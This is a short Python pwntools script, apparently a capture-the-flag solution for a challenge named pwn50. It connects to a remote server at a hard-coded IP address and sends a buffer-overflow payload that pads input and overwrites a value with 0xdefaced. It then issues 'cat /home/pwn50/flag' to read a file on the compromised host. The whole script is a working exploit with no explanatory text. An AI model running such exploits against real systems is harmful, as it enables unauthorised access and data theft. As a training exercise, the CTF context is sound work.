from pwn import *
server = "54.67.102.66"
port = 5251

p = remote(server, port)

payload = "b" + "u" + "g" + "a"*0x15 + p64(0xdefaced)

p.sendline(payload)
p.sendline("cat /home/pwn50/flag")
print p.recv()
